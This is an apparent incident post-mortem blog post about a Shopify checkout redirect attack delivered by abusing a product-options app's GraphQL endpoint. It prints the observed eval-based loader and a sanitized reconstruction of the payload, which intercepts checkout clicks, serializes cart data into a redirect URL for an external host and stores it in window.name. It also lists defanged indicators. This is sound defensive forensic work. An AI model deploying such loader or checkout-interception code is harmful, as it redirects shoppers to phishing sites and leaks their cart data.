---
title: "When Checkout Becomes an Attack Surface: Forensics of a Shopify Redirect Incident"
date: 2026-07-31
author: Geert De Ron
categories: [Cybersecurity, Incident Response, Ecommerce]
tags: [Shopify, GraphQL, Supply Chain Security, Web Security]
---

*A merchant-side investigation into unauthorized GraphQL execution, malicious storefront objects, and the limits of emergency containment*

*This post-mortem will be updated as additional forensic evidence, vendor information, or confirmed scope details become available.*

## Executive summary

On 30 July 2026, our webshop, [Caro B Handmade](https://www.carobhandmade.be), began exhibiting behavior that initially looked like a checkout or inventory problem. Customers encountered a misleading “sold out” message on an available product. More seriously, checkout traffic could be intercepted and redirected to an unrelated, phishing-style destination.

This was not a theme bug.

A forensic investigation showed that a third-party Shopify app, YMQ Product Options & Variants, had been abused to execute unauthorized GraphQL operations. The attacker used that capability to create a Shopify Page containing JavaScript and to create storefront injection objects. A global loader fetched the page, extracted hidden JavaScript, and executed it in the customer’s browser. The payload intercepted checkout events, collected cart metadata, and redirected the browser away from Shopify checkout.

The immediate customer-facing attack path was contained by hiding the malicious Shopify Page. Shopify subsequently disabled or restricted the affected app. The app vendor reported that the underlying issue was caused by insufficient validation of attacker-controlled `query` and `variables` parameters in an authenticated backend request. The vendor stated that the issue affected at least three stores, although the complete scope was not yet known at the time of the response.

This post documents what we observed, what we can attribute with confidence, and the defensive lessons that apply to merchants, app developers, and platform operators.

## The initial symptom was deliberately misleading

The first visible symptom was a browser alert stating that a personalized baby blanket was sold out. Shopify inventory data showed the opposite: the product was active, the default variant was available, and inventory was present.

The message was produced by the YMQ product-option flow as a generic fallback when an add-to-cart request failed. It did not prove that the product was sold out. This distinction mattered because the misleading message could have sent the investigation in the wrong direction.

The security symptom appeared when checkout behavior was examined in a clean browser context. Clicking checkout did not lead directly to the expected Shopify checkout flow. Instead, a JavaScript payload intercepted pointer events, clicks, and form submissions, prevented the normal event, read `/cart.js`, normalized the cart contents, and constructed a redirect URL to an external domain.

![Customer-facing misleading sold-out alert](/assets/images/shopify-incident/sold-out-alert.jpg)

*Figure 1 — The customer-facing symptom: a misleading sold-out alert on a product that Shopify reported as available. The screenshot contains no customer data; the product and store names are retained as incident evidence.*

The payload also stored a serialized representation of the cart in `window.name`. We found no evidence that payment credentials were entered or transmitted during our investigation, and we did not interact with the external destination beyond preserving the observed evidence.

## Attack chain

The incident consisted of multiple linked components rather than a single modified theme file:

```text
Authenticated app request
        |
        v
Unauthorized GraphQL execution
        |
        +--> Malicious Shopify Page
        |       |
        |       +--> Hidden JavaScript payload
        |
        +--> Storefront injection / loader
                |
                v
        Fetch page -> parse hidden content -> execute with eval()
                |
                v
        Intercept checkout -> collect cart metadata -> redirect browser
```

The loader observed in Shopify-generated storefront output was functionally equivalent to:

```javascript
fetch('/pages/ymq-r-26b76f38fd?v=26b76f38fd')
  .then(r => r.text())
  .then(t => {
    const d = new DOMParser().parseFromString(t, 'text/html');
    (0, eval)(d.querySelector('#v3').value);
  });
```

The loader was only the delivery mechanism. The reconstructed checkout logic below shows the next stage of the attack. It is intentionally sanitized and simplified; it is not a verbatim copy of the captured payload:

```javascript
const redirectTarget = 'https://[redacted]/';

async function interceptCheckout(event) {
  const element = identifyCheckoutElement(event);
  if (!element) return;

  event.preventDefault();
  event.stopImmediatePropagation();

  const cart = await fetch('/cart.js').then(response => response.json());
  const order = normalizeCart(cart);
  const context = {
    site: location.hostname,
    sourceUrl: location.href,
    order
  };

  const redirect = new URL(redirectTarget);
  redirect.searchParams.set('co', encodeBase64Url(context));
  window.name = '__CHECKOUT_CONTEXT__:' + JSON.stringify(context);
  location.assign(redirect.href);
}

window.addEventListener('pointerdown', interceptCheckout, true);
window.addEventListener('click', interceptCheckout, true);
window.addEventListener('submit', interceptCheckout, true);
```

This illustrates why the incident was more serious than a broken checkout button. The payload operated at the browser boundary, cancelled the legitimate Shopify event, read cart contents, serialized the shopping context, and redirected the customer to an external destination. The exact captured payload used different helper names and additional fields; those details are omitted here to keep the example useful for detection without republishing the complete attack artifact.

This pattern is high risk even before considering the specific redirect. It turns a remotely retrievable Shopify Page into executable code through `eval()`. The page does not need to be part of the theme repository, and the attacker does not need to modify a Liquid template if the delivery mechanism can fetch and execute the page at runtime.

The reconstructed payload used an external redirect destination, encoded cart information into URL parameters, and set `window.name` before navigation. The observed indicators included:

```text
httpbingo[.]org
bu008feng[.]my
jqek9c[.]bond
/pages/ymq-r-26b76f38fd
YMQ-ADMIN-GQL-REDIRECT-OVERLAY-V1
```

A later screenshot showed a second dangerous checkout-like destination, `jqek9c[.]bond`, displaying unrelated products and a USD 960 total.

![Unrelated dangerous checkout destination](/assets/images/shopify-incident/dangerous-redirect.jpg)

*Figure 2 — Browser security warning displayed on an unrelated checkout-like page containing products that were not sold by Caro B Handmade. The domain is intentionally left visible in the evidence image so defenders can correlate it with the defanged IOC list.*

We treat it as a related incident indicator, but the exact redirect relationship was not established from the available evidence.

## Forensic findings

### The malicious page was not in the Git repository

We searched the current theme, all reachable Git references, historical commits, exact strings, regular-expression history searches, unreachable Git objects, and common redirect and obfuscation patterns. The malicious redirect implementation was not present in the repository.

This ruled out a simplistic “revert the last theme commit” response. The storefront behavior was being delivered through Shopify-managed or app-managed surfaces outside the normal theme source tree.

### The legitimate app assets were separate from the malicious loader

The normal YMQ extension assets rendered the product customization controls and were hosted on Shopify’s extension CDN. The suspicious loader was separate: it appeared in Shopify-generated page output and referenced an external delivery URL.

The legitimate YMQ JavaScript inspected during testing did not contain the incident indicators such as `httpbingo[.]org`, `bu008feng[.]my`, `window.name`, or the redirect logic. It did contain cart-related functionality and several uses of `eval()` for vendor-supplied configuration and rules, which became an important risk consideration during the review.

The presence of legitimate app functionality alongside a malicious delivery path is precisely why disabling every app or reverting the theme is not always the best first response. Incident response has to distinguish the normal business capability from the compromised or abused capability.

### Shopify audit data established Page creation by YMQ

Shopify’s audit data identified the relevant object:

```text
Title:       YMQ redirect validation 26b76f38fd
Handle:      ymq-r-26b76f38fd
Created:     2026-07-30 19:11:58 UTC
Creator:     Ymq Product Options
```

The YMQ installation had relevant content and storefront permissions, including the ability to write content, themes, and script tags.

![YMQ storefront permissions](/assets/images/shopify-incident/app-permissions.jpg)

*Figure 3 — Shopify permission evidence showing access to themes, webshop script tags, and webshop pages. No account identifiers, tokens, or customer records are visible in the published crop.*

The Page body contained the redirect payload.

This is strong direct attribution of Page creation to the YMQ app identity. It does not, by itself, prove that the vendor’s own infrastructure was compromised. The vendor’s explanation was that the attacker abused an authenticated API endpoint that accepted attacker-modified GraphQL input.

The global loader remains a separate attribution question. The Page creator and the mechanism that registered or delivered the loader may have been the same app component, another app-managed surface, or another actor using the resulting capability. This distinction is important: attribution of one malicious object should not automatically be generalized to every component in the delivery chain.

## Root cause: authenticated did not mean authorized

According to the vendor’s incident response, the affected backend endpoint accepted `query` and `variables` parameters supplied by the frontend. Those parameters were intended to create draft orders, but the backend executed submitted GraphQL without sufficiently constraining the operation to the intended mutation.

An attacker who could modify the request could therefore submit a different GraphQL operation while retaining an authenticated request context. The result was unauthorized GraphQL execution with the app’s granted permissions.

The security failure was not simply “missing authentication.” It was a failure at the boundary between:

- authentication: who is allowed to make the request; and
- authorization and operation integrity: which operation that request is allowed to perform.

The vendor reported remediation steps including restricting the endpoint to `draftOrderCreate`, validating the submitted operation and variables, and tightening request authentication.

For application developers, this is a familiar but recurring lesson: never treat client-supplied GraphQL documents as trusted merely because the request carries a valid session or token. If an endpoint is intended to perform one operation, enforce that operation server-side. Prefer persisted operations or an allowlist over execution of arbitrary client-provided documents.

## Timeline

| Time | Event |
|---|---|
| 2026-07-30 19:11:58 UTC | Shopify records creation of the malicious Page by Ymq Product Options. |
| 2026-07-30 | Customers observe misleading product and checkout behavior. |
| 2026-07-30 | Forensic analysis identifies the loader, hidden payload, checkout interception, and external redirect. |
| 2026-07-30 20:59:34 UTC | The malicious Page is hidden as emergency containment. A fresh browser request returns a genuine Shopify 404. |
| Approximately 9 hours before the vendor follow-up | Shopify restricts the affected app’s API access. |
| Approximately 8 hours before the vendor follow-up | YMQ reports completing code updates. |
| 2026-07-31 03:09 CEST | YMQ reports that the cause was identified and fixed. |
| Subsequently | Shopify confirms the issue is related to YMQ Product Options & Variants and disables the app to protect merchants and customers. |

## Containment and validation

The first containment action was intentionally narrow: hide the malicious Page rather than immediately disabling all product customization functionality.

That action blocked the known payload route. A browser validation confirmed that the Page URL returned Shopify’s 404 response and that the redirect destination was no longer reached through the tested route.

However, the investigation also showed why hiding the Page alone was not sufficient remediation. Before app access was revoked, the global loader was still present on cart and product pages and continued to request the now-hidden Page. The loader therefore remained a latent execution path even though its current fetch resulted in a 404 and a JavaScript error.

The closure criteria were defined as:

1. no requests to the loader or redirect indicators;
2. no malicious Page or equivalent object remaining active;
3. no suspicious resources in a clean browser session;
4. functional product customization;
5. successful add-to-cart behavior; and
6. normal Shopify checkout navigation on desktop and mobile.

No real customer data or payment information was used in validation. The controlled test cart was cleared after testing.

## Lessons for merchants

### 1. Treat checkout redirects as a security incident

A checkout failure can be an availability or integration problem. A checkout redirect to an unrelated domain is a security event. Preserve the URL, browser warning, timestamp, screenshot, and resource chain before changing the environment.

### 2. Inventory all execution surfaces

Theme files are only one layer. Review app embeds, script tags, pixels, custom Liquid, Shopify Pages, checkout extensions, and any app-managed global loaders. A clean Git repository does not prove a clean storefront.

### 3. Review app scopes as an attack surface

An app that manages product options may not need permission to create pages, modify themes, or register global scripts. Broad scopes increase blast radius when an app endpoint is abused or an authorization token is misused.

### 4. Preserve evidence before deletion

Hide or disable the malicious object when necessary for customer safety, but preserve the object body, URL, screenshots, audit events, timestamps, and relevant response data first whenever operationally possible. Deleting the object can destroy the evidence needed for attribution.

### 5. Do not confuse containment with remediation

Returning a 404 for the known malicious Page stopped the observed payload, but it did not remove the loader that attempted to fetch and execute it. Every containment action should be followed by a search for the delivery mechanism and a clean-browser revalidation.

### 6. Use least privilege and operation allowlists

For app developers, authenticated GraphQL endpoints must still enforce operation-level authorization. If a route is intended to execute one mutation, do not accept arbitrary GraphQL supplied by the browser.

## Closing thoughts

This incident began with a misleading inventory message and ended as a supply-chain-style storefront compromise involving an app capability, unauthorized GraphQL execution, a malicious Shopify Page, and browser-side checkout interception.

The most important conclusion is not that one app was vulnerable. It is that modern ecommerce platforms are distributed execution environments. Code can arrive through the theme, an app extension, a generated header, a script registration, a content object, or an API-created resource. Effective incident response therefore requires correlating browser evidence, platform audit logs, application permissions, and source repositories.

For small merchants, the practical playbook is straightforward:

- preserve evidence;
- contain the exact customer-facing path;
- identify every delivery layer;
- revoke unnecessary permissions;
- rotate exposed credentials;
- validate with a clean browser; and
- do not declare closure until the normal business flow works without the indicators of compromise.

A broken checkout is an operational problem. A checkout that can be rewritten by an external actor is an incident.

I documented the incident, the attack chain, and the defensive lessons that apply to merchants, app developers, and platform operators.

## Indicators of compromise

The indicators below are intentionally defanged for publication:

```text
httpbingo[.]org
bu008feng[.]my
jqek9c[.]bond
/pages/ymq-r-26b76f38fd
YMQ redirect validation 26b76f38fd
YMQ-ADMIN-GQL-REDIRECT-OVERLAY-V1
YMQ-26b76f38fd
```

*This post is based on merchant-side forensic evidence, Shopify audit data, controlled browser validation, and the affected vendor’s incident communications. It does not claim that payment credentials were captured; no such evidence was established in the investigation.*
